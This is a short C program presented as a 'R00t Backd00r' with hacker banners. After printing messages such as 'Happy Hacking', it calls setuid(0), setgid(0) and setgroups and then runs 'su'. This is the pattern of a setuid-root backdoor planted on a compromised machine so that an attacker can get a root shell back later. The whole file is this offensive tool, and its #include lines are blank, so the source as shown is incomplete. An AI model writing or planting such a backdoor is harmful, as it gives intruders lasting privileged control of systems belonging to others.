#include
#include
#include
int main()
{
system("echo ");
system("echo -==[ R00t Backd00r ]==-\r\n");
system("echo -==[ x.d.0.0.r ]==-\r\n");
system("echo -==[ Happy Hacking ]==-\r\n");
system("echo ");
system("echo Starting Interactive Shell...\r\n");
system("echo Session Started. Enjoy the hack !!");
system("echo ");
setuid(0);
setgid(0);
setgroups(0,0);
system("su");
system("exit");
return 0;
}
